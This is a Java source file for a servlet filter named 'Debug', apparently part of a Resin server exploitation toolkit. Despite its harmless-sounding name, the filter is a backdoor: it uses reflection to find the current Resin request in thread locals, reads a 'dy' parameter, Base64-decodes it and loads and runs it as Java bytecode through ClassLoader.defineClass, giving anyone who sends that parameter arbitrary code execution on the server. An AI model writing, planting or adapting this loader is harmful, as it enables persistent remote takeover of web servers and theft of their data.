package com.sorry.bug.resin;


import com.sorry.utils.reflect.Reflections;

import javax.servlet.*;
import java.io.IOException;

/**
 * created by 0x22cb7139 on 2021/9/30
 */
public class Debug implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        try{
            boolean flag = false;
            String dy = null;
            Thread[] threads = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
            for(int i = 0; i < threads.length; ++i) {
                Thread thread = threads[i];
                if (thread != null) {
                    String name = thread.getName();
                    if(getFV(thread,"threadLocals")!=null){
                        Object[]  tables = (Object[]) getFV(getFV(thread,"threadLocals"),"table");
                        for(int j=0;j<tables.length;j++){
                            if(tables[j]!=null){
                                if(getFV(tables[j],"value")!=null){
                                    if(getFV(tables[j],"value").getClass().getName().equals("com.caucho.server.http.HttpRequest")){
                                        Object request = getFV(tables[j],"value");
                                        try{
                                            dy = (String) request.getClass().getSuperclass().getDeclaredMethod("getParameter", new Class[]{String.class}).invoke(request, new Object[]{new String("dy")});
                                        }catch(NoSuchMethodException e){
                                            Object HttpServletRequestImpl = getFV(request,"_requestFacade");
                                            dy = (String) HttpServletRequestImpl.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(HttpServletRequestImpl, new Object[]{new String("dy")});
                                        }finally{
                                            if(dy!=null && !dy.isEmpty()){
                                                byte[] bytecodes = org.apache.shiro.codec.Base64.decode(dy);
                                                java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                                                defineClassMethod.setAccessible(true);
                                                Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});
                                                java.util.Map<String, Object> objs = new java.util.HashMap<String, Object>();
                                                objs.put("request",request);
                                                objs.put("bytecodes",bytecodes);
                                                cc.newInstance().equals(objs);
                                                flag = true;
                                            }
                                        }
                                    }
                                }
                                if (flag) {break;}
                            }
                            if (flag) {break;}
                        }
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }


    public static Object getFV(Object obj,String fieldName) throws Exception{
        java.lang.reflect.Field f0 = null;
        Class clas = obj.getClass();
        while (clas != Object.class){
            try{
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }

    @Override
    public void destroy() {

    }
}
